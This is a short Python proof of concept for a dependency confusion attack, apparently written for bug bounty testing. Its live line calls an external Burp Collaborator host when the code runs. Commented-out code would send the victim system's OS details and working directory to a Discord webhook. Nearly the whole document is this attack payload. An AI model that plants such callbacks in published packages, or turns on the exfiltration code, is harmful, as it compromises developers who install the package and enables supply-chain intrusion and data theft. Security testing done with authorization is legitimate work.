# python package dependency confiuse vulnerability POC 
# name: techghoshal
# e-mail: techghoshal@gmail.com
# Impact this vulnerability: Remote code execution(RCE)


import requests
#from discord import SyncWebhook
#import os

## canarytokens_url OR burp collaborator URL
requests.get("http://gvf76n4hkwjaa2fv4648put27tdk1bp0.oastify.com")

## Send target system info to your discord server 
#webhook = SyncWebhook.from_url("<discord_webhook_url>")

#osname =  os.uname()
#cwd = os.getcwd()

#webhook.send(f"OS-Info: {osname}")
#webhook.send(f"Current-DIR: {cwd}")
